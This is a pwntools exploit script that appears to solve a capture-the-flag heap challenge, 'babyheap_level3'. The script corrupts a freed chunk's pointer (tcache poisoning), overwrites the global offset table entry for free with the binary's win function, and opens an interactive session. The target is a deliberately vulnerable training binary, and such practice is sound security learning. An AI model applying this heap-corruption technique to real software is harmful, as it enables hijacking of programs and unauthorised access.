#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyheap_level2
from pwn import *

os.chdir('/challenge')
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'babyheap_level3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)


END_OF_MENU = b"Choice:"
def malloc(p, size, content):
    p.sendline(b"1")
    p.recvuntil(b"chunk?:")
    p.sendline(b"%d" % (size))
    p.recvuntil(b"Content:")
    p.sendline(b"%b" % (content))
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"2")
    p.recvuntil(b"Index:")
    p.sendline(b"%d" % (index))
    p.recvuntil(b"content:")
    p.sendline(b"%b" % (content)) 
    p.recvuntil(END_OF_MENU)

def launch_attack(p):
    malloc(p, 8, b'a')
    malloc(p, 8, b'a')
    free(p, 1)
    content = b'a'*(0x20 - 8) + b'\x21' + b'\x00'*7 + p64(exe.got['free']) 
    free(p, 0)     
    malloc(p, 8, content)
    malloc(p, 8, b'a')
    malloc(p, 8, p64(exe.symbols.win ))
    p.interactive()

io.recvuntil(END_OF_MENU)
launch_attack(io)
io.interactive()

